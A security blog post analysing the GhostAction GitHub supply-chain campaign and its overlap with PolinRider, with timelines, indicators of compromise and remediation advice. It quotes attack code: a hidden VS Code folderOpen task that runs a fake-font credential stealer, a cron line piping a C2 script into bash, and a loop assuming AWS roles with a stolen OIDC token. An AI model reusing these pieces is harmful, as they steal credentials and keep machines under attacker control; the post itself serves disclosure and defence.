# extract: served via trafilatura-direct
---
title: "GhostAction Crosses Paths With PolinRider: Inside the October Escalation"
author: Gaetan Ferry
url: https://blog.gitguardian.com/ghostaction-x-polinrider/
hostname: gitguardian.com
description: GhostAction pushed 72,026 commits to 22,964 repos in nine days, now targeting CI runners and developer machines with a launcher copied from PolinRider.
sitename: GitGuardian Blog - Take Control of Your Secrets Security
date: "2026-10-27"
tags: ['Breach explained']
fingerprint: "1ee5a59b429d2f68"
---
## TL;DR

- Between Oct. 13 and Oct. 21, 2026, the GhostAction operator pushed 72,000 commits to 23,000 public repositories. 8,000 of them are new victims. 1,382 of the 1,792 compromised accounts had already been used on Oct. 8, so the same stolen tokens keep working.
- The campaign now ships five payload families. It now also targets developer machines, self-hosted runners, and AWS roles reachable through OpenID Connect (OIDC).
- One family is a Node.js stealer disguised as a font file and launched by VS Code when a developer opens the git repository. The launcher is the one used by PolinRider, another campaign that hides loaders in developer repos.
- From Oct. 22 to 26, PolinRider loaders were added to GhostAction commits, which were then force-pushed.
- Three families install a cron job that runs a script from the command-and-control (C2) server every five minutes. Cleaning the repository does not remove it.
- The last GhostAction commit we saw was pushed at 04:37 UTC on Oct. 21.

All counts in this post are lower bounds: they only include what our feed observed. Times are UTC.

This evolution in the campaign has been independently observed by multiple parties, including OpenSource Malware. Read their detailed analysis [<u>on the OSM website</u>](https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file?ref=blog.gitguardian.com).

## Where we left off

In [<u>our previous post</u>](https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/), we described the "Security Audit" wave of Oct. 8 to 12. The operator pushed `security-audit.yml` to about 30,000 repositories, with a payload that greps the working tree and the full git history for credentials. GitHub started blocking runs of new malicious workflows around Oct. 9, so later drops couldn't exfiltrate anything.

The operator did not stop. On Oct. 13, a new set of commits began to appear with a new set of payloads no longer limited to GitHub Actions.

## 72,026 commits in nine days

After the previous cut-off (10:28 UTC on Oct. 12), we counted 72,026 commits from the operator across 22,964 repositories, 2,875 owners and 1,792 pushing accounts. Of those repositories, 14,906 were already Oct. 8 victims. The other 7,989 are new.

The 72,026 commits are unevenly spread. Oct. 14 to 16 account for 67,556 of them.

Oct. 15 is the peak, with 32,099 commits. The operator then went quiet for two days before a smaller burst from Oct. 19 to 21. This pause could have been a reaction to takedowns.

This iteration of the campaign spreads 5 payload families, which we’ll detail in this blog post:

- Security-audit re-point
- Seven-workflows
- Self-hosted runner
- Font stealer
- Legacy OIDC

The accounts are the same ones as before. 1,382 of the 1,792 pushing accounts had already pushed the Oct. 8 payload. As we observed during the previous waves, the operator relies on tokens that were stolen earlier and never revoked.

| Date (UTC) | Event | 
|---|---|
| Oct. 13, 22:58 to Oct. 14, 07:56 | 6,370 existing `security-audit.yml` files re-pointed to port 8080 | 
| Oct. 14, 13:22 | Seven-workflows family starts | 
| Oct. 14, 14:11 | Self-hosted runner family starts | 
| Oct. 14, 21:39 | Font stealer starts | 
| Oct. 20, 14:16 | Original `github_actions_security.yml` comes back with OIDC | 
| Oct. 21, 04:37 | Last commit from the operator | 

## Five payload families

The operator now plants different files depending on where it wants the code to run.

| Family | Files | Runs on | Commits | Repositories | 
|---|---|---|---|---|
| Security-audit re-point | `security-audit.yml` (update) | GitHub-hosted runner | 6,988 | 6,902 | 
| Seven workflows | `audit.yml`, `build-check.yml`, `repo-health.yml`, `lint.yml`, `ci-check.yml`, `test-suite.yml`, `code-review.yml` | GitHub-hosted runner | 33,411 | 19,153 | 
| Font stealer | `public/fonts/fa-solid-400.woff2`, `.vscode/tasks.json` | Developer machine | 30,804 | 17,667 | 
| Self-hosted | `maintenance.yml`, `cache-cleanup.yml`, `runner-maintenance.yml`, `cleanup-job.yml`, `cleanup_cache.yml` | Self-hosted runner | 257 | 172 | 
| Legacy OIDC | `github_actions_security.yml` | GitHub-hosted runner and AWS | 568 | 418 | 

**Security-audit re-point.** Only the curl line changes: `http://193.32.204[.]199/?c=new` becomes `http://193.32.204[.]199:8080/?c=auto_20261013`. The body is the Oct. 8 payload.

**Seven workflows.** Each file lands in its own commit with an innocuous message such as "Add build check workflow", so one repository can receive seven pushes. This payload (v5) adds four AI-provider patterns to the credential grep: `sk-oat-`, `sk-svcacct-`, `gsk_`, and `xai-`. It also clones the repository wiki with the workflow's `GITHUB_TOKEN` and greps it. If the POST to the C2 fails, it creates a private gist named "build cache" with a `c.dat` file so that the data can be picked up later with the stolen token.

**Self-hosted.** These workflows use `runs-on: self-hosted`. They query the cloud Instance Metadata Service (IMDS) for role credentials, then read credential files for AWS, PyPI, npm, Docker, kube, GitHub CLI, Claude, Gemini, OpenAI, and Hugging Face, plus SSH keys and `.env` files. Only 172 repositories received this payload. A self-hosted runner is a persistent machine inside the victim's network, making this payload a potential pivot inside the victim’s own network.

**Legacy OIDC.** The original 2025 template returns on Oct. 20, with a twist. It requests a GitHub OIDC token and tries to assume every IAM role ARN found in the environment:

```
for var in $(compgen -v 2>/dev/null); do
  val="${!var}"
  case "$val" in
    arn:aws:iam::*:role/*)
      aws sts assume-role-with-web-identity --role-arn "$val" \
        --role-session-name "secret$j" --web-identity-token "$TOK" ...
```
The resulting sessions are exfiltrated. A few variants (`full1`, `oidcm2`, `oidcf`) test the same idea on a handful of repositories. One of them has comments in French.

## 415 Unsupported Media Type: the font that is not a font

The fourth family does not use GitHub Actions at all and is where GhostAction meets PolinRider.

### A font file that runs on folder open

The operator pushes two files in separate commits. `public/fonts/fa-solid-400.woff2` ("Add font assets") is a plain Node.js script. `.vscode/tasks.json` ("Add editor task") defines a hidden task:

```
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''",
  "isBackground": true,
  "hide": true,
  "presentation": { "reveal": "never", "echo": false, "close": true },
  "runOptions": { "runOn": "folderOpen" }
}
```
When a developer opens the folder in VS Code and trusts the workspace, the task runs the "font". The script reads `~/.aws/credentials`, `.pypirc`, `.npmrc`, `.git-credentials`, `.netrc`, `~/.claude/.credentials.json`, `~/.gemini/oauth_creds.json`, and `.kube/config`. It also collects SSH keys and environment variables that match AWS, Anthropic, OpenAI, and generic token prefixes. A grep of the home directory looks for AWS, Anthropic, GitHub, npm, and PyPI secrets. Everything is posted to `193.32.204[.]199:8080/?c=<tag>`, and the script installs the cron job described below.

17,667 repositories carry this pair of files. GitHub's workflow hold does not apply, since no workflow is involved.

### The launcher is a copy

The technique belongs to PolinRider, a campaign that hides obfuscated loaders in developer repositories and runs them through a `folderOpen` task. The PolinRider campaign was originally attributed to the DPRK threat actor.

The victims’ repository history contains a `.vscode/tasks.json` with the same `eslint-check` label, the same hidden presentation block, and the same shell command, including the `|| echo ''` fallback. Only the file name differs: `fa-solid-500.woff2` instead of `fa-solid-400.woff2`. That file is a 32,003-byte obfuscated loader, and it sits in a commit that is an ancestor of the commits GhostAction pushed to this repository.

The loaders we found in the Oct. 22 to 26 rewrites use `fa-solid-300.ttf` and a simpler command: `node` with the file as an argument. GhostAction uses the older form.

### What the PolinRider chain does

The PolinRider loaders inside GhostAction repositories have five stages.

1. **Loader.** An obfuscated script is appended after a long run of whitespace in a project file (`api.js`) or stored in a fake font (`fa-solid-300.ttf`, `fa-solid.lkf`). `tasks.json` launches it.
2. **Resolver.** The loader looks up the latest transaction sent from a hard-coded Ethereum address, through public RPC endpoints with a block explorer fallback. The loader decodes the transaction’s 20-byte destination address into two IPv4 addresses. Changing the C2 only requires pushing a new transaction, making it harder to take down the malicious infrastructure.
3. **Staged downloads.** The loader fetches `/0x/cls` and `/0x/ls` from the resolved server on port 443, decodes them with hard-coded XOR keys, and runs them with `node -e`. The next downloads include a 71 KB boot script, a 161 KB client body, and a 1.5 MB script marked `/*RS260605*/`.
4. **Persistence.** A script writes a runner into `~/.node_modules/` (`.npm-ws-runner.js`, `.npm-ws.json`, `.npm-ws.pid`) that keeps fetching code from the C2. The 1.5 MB script references `sandbox-runtime/out/main.js` and `@vscode/deviceid` and keeps `.inz.orig` backups. \[TODO: confirm what it patches.\]
5. **Stealer.** A Python script installs its own dependencies with `pip`. It targets Chrome, Edge, Brave, and Firefox logins and cookies, plus 150 browser extensions covering password managers and crypto wallets, and sends the data in chunks.

The objectives differ from GhostAction's. PolinRider's last stage targets browser sessions, password vaults, and wallets. GhostAction's font stealer goes after cloud, registry, and AI tool credentials.

### GhostAction commits rewritten to PolinRider

In total, 188 GhostAction commits were pushed along with a PolinRider loader. In most cases, the commit was amended in place. The author, the date, and the message are unchanged, but PolinRider loaders (`api.js`, `fa-solid-300.ttf`, `tasks.json`) have been added or swapped in, and the branch was force-pushed.

### Copycat or same actor?

There are no clear indicators that the PolinRider and GhostAction threat actors are related.

Signs of a link:

- The two campaigns infect the same repositories. Whoever force-pushed over the GhostAction commits had write access to them.
- GhostAction adopted a PolinRider-inspired launcher with its own C2 infrastructure.

Signs of separate operators:

- The payloads share nothing else. GhostAction's font stealer is about 40 readable lines, posting to an IP address on port 8080. PolinRider's is a multi-stage, obfuscated chain with an Ethereum-based C2.
- The goals differ: CI and developer credentials versus browser data and wallets.
- In our previous post, we showed that several unrelated actors reused the same stolen GitHub credentials from GhostAction.

Our working hypothesis is that GhostAction's operator copied a public PolinRider launcher, and that both groups hold overlapping sets of victims.

## A cron job that outlives the cleanup

Three GhostAction payloads install the same persistence: the font stealer, the self-hosted workflows, and the `full1` variant:

```
*/5 * * * * curl -s -m 10 http://193.32.204[.]199:8080/c2/$(hostname) | bash  #ghc2
```
Every five minutes, the machine asks the C2 for a shell script and runs it. The operator can tailor what each host receives. A developer laptop or a runner that executed one of these payloads stays under control after the repository is cleaned.

## Does GitHub's workflow hold stop it?

We found no successful run for any of the GhostAction payloads, either the reworked legacy or newer ones. The malicious workflow definitions were all caught by GitHub, and their execution was prevented.

Additionally, the self-hosted runner family originally contained a YAML syntax error that prevented the workflow from running.

However, the PolinRider-styled infostealer, part of the GhostAction campaign, was not meant to run in the CI. As such, GitHub’s security measures couldn’t prevent it from executing on the developer endpoints.

## What to do now

If you own an affected repository or account:

1. Delete every file listed in the indicators below, on every branch. Do not revert "Update" commits: reverting restores the previous malicious version.
2. Revoke the account's tokens: personal access tokens, OAuth apps, and SSH keys. We saw re-infection after clean-up when tokens were kept.
3. Rotate every credential committed in the repository or its history, every Actions secret, and every credential stored in the wiki.
4. On any machine that opened an affected repository in VS Code, and on any self-hosted runner, look for `#ghc2` in the crontab, remove it, and rotate all local credentials: cloud, registries, AI tools, SSH, and kube.
5. Look for private gists named "build cache" with a `c.dat` file on the account.
6. Search AWS CloudTrail for `AssumeRoleWithWebIdentity` calls from GitHub's OIDC provider on unexpected repositories or branches.
7. Restrict OIDC trust policies to specific repositories and branches, and require approval for workflow changes.
8. Search your repositories for `.vscode/tasks.json` files with a `folderOpen` task, and for "fonts" that are text files.

Every developer laptop is a credential store, and the font stealer reads the same files you would find on any of them. [Developer Endpoint Protection](https://www.gitguardian.com/?ref=blog.gitguardian.com) can inventory those credentials by machine so you know what to revoke first.

Cleaning the repository is the easy part. The credentials are the ones that still work.

## Indicators of compromise

### GhostAction

| Type | Value | 
|---|---|
| Exfiltration | `hxxp://193.32.204.199:8080/?c=<tag>` | 
| Tags | `auto_20261013`, `auto_20261014`, `auto_20261015`, `auto_20261021`, `reinject`, `p16n`, `ssh1`, `ssh19`, `full1`, `oidcm2`, `oidcf`, `og1`, `og2`, `oidc_og2`, `qwdp`, `new20` | 
| Cron C2 | `hxxp://193.32.204.199:8080/c2/<hostname>` | 
| Crontab marker | `#ghc2` | 
| Gist fallback | Private gist "build cache" with a `c.dat` file | 

| File | Commit message | Family | 
|---|---|---|
| `.github/workflows/audit.yml` | "Add audit workflow" | Seven workflows | 
| `.github/workflows/build-check.yml` | "Add build check workflow" | Seven workflows | 
| `.github/workflows/repo-health.yml` | "Add repo health workflow" | Seven workflows | 
| `.github/workflows/lint.yml` | "Add linting workflow" | Seven workflows | 
| `.github/workflows/ci-check.yml` | "Add CI check workflow", "ci: add check", "Add CI check" | Seven workflows (OIDC variants) | 
| `.github/workflows/test-suite.yml` | "Add test suite workflow" | Seven workflows | 
| `.github/workflows/code-review.yml` | "Add code review workflow" | Seven workflows | 
| `.github/workflows/maintenance.yml` | "Add maintenance workflow" | Self-hosted | 
| `.github/workflows/cache-cleanup.yml` | "Add cache cleanup" | Self-hosted | 
| `.github/workflows/runner-maintenance.yml` | "Add runner maintenance" | Self-hosted | 
| `.github/workflows/cleanup-job.yml` | "Add cleanup job" | Self-hosted | 
| `.github/workflows/cleanup_cache.yml` | "Add cleanup workflow" | Self-hosted | 
| `.github/workflows/github_actions_security.yml` | "Add Github Actions Security workflow" | Legacy OIDC | 
| `public/fonts/fa-solid-400.woff2` | "Add font assets", "Add font asset" | Font stealer | 
| `.vscode/tasks.json` | "Add editor task", "Add editor config" | Font stealer | 

### PolinRider (found in co-infected repositories)

| Type | Value | 
|---|---|
| Ethereum sender address | `0x1eef0849eda15d87f64e51c73c8442cf3c8bcef3` | 
| Fallback C2 (persistence script) | `hxxp://95.135.181.151:443` | 
| Launcher | `.vscode/tasks.json`, task `eslint-check`, `runOn: folderOpen`, running `./public/fonts/fa-solid-300.ttf` | 
| Files | `api.js` (loader after whitespace), `public/fonts/fa-solid-300.ttf`, `fa-solid.lkf`, `temp_auto_push.bat` | 
| Staged paths | `/0x/cls`, `/0x/ls`, `/0x/js` | 
| Persistence | `~/.node_modules/.npm-ws-runner.js`, `.npm-ws.json`, `.npm-ws.pid` | 
| Markers | `/*RS260605*/`, `/*M260630A*/` | 
| SHA-256 `api.js` | `b59e598ded824c7318ca9fae4e9a6d98c9600873677ece7d9896870e3e7ced8e` | 
| SHA-256 `fa-solid-300.ttf` | `7ba0a30eabfa46008d6417532533199bbf351b27f3841477e9133f43fb404d24` | 
| SHA-256 `tasks.json` | `284d167f51c93b90100b7faeaec971959c1f8bb642e7ea0de50190a5a306f3d8` |
